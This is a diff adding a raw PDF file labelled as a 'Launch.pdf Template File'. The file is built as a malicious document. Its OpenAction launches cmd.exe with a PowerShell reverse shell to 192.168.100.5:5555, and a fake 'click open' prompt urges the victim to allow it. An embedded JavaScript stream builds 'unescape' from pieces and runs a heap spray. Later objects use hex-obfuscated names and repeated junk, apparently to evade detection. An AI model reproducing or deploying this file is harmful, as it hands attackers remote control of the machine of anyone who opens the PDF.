@@ -1,0 +1,151 @@
+%PDF-8.31337
+
+101 0 obj
+<<
+ /Type /Catalog
+ /Outlines 102 0 R
+ /Pages 103 0 R
+ /OpenAction 108 0 R
+>>
+endobj
+
+102 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+103 0 obj
+<<
+ /Type /Pages
+ /Kids [104 0 R]
+ /Count 1
+>>
+endobj
+
+104 0 obj
+<<
+ /Type /Page
+ /Parent 103 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 105 0 R
+ /Resources 
+ << /ProcSet 6 0 R
+    /Font << /F1 7 0 R >>
+ >>
+>>
+endobj
+
+105 0 obj
+<< /Length 46 >>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(Launch.pdf Template File)Tj
+ET
+endstream
+endobj
+
+106 0 obj
+[/PDF /Text]
+endobj
+
+107 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+108 0 obj
+<<
+ /Type /Action
+ /S /Launch
+ /Win
+ <<
+  /F (cmd.exe)
+  /P (
+     /C powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.5', 5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+     /K \n\n Click the "open" button to view this document.
+  )
+ >>
+stream
+if (app.viewerType == 'Reader') {
+    	var a = "uln"
+    	var b = "els"
+    	var c = "ple"
+    	var e = "cla"
+    	var f = a + b + e + c
+    	var g = f.replace(/l/g,"")
+    
+	var xk427bu = '%fud3c3c%fud3c3c%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud4141%fud3e3e%fud3e3e';
+ 
+	var i = xk427bu.replace(/fud/g,"u")
+    	var j = g + "(" + i + ")"
+	var tqgw5x2 = eval(j)
+
+	var slide_size=0x100000;
+	var size = 300;      
+	var x = new Array(size);
+	while (tqgw5x2.length <= slide_size/2) 
+		tqgw5x2 += tqgw5x2;
+ 
+	for (i=0; i < size; i+=1) {
+        	id = ""+i;
+        	x[i]= tqgw5x2.substring(4,slide_size/2-id.length-20)+id;
+	} 
+}        
+endstream
+>>
+endobj
+2 0 obj
+<<	/S /#4a#61v#61#53cri#70t%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/#4a#53%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+1 0 R%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+>>	
+endobj
+3 0 obj
+<<%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/#54y#70e%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/#43#61#74alo#67%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/P#61ges	4 0 R /Open#41ctio#6e%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+2 0 R%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+>> 
+endobj
+4 0 obj
+<<%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/Ty#70#65 /#50ag#65#73%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/#4b#69#64#73%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+[5 0 R]%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/C#6f#75#6et +0001.000	>> 
+endobj
+5 0 obj
+<<%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+/T#79#70#65%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
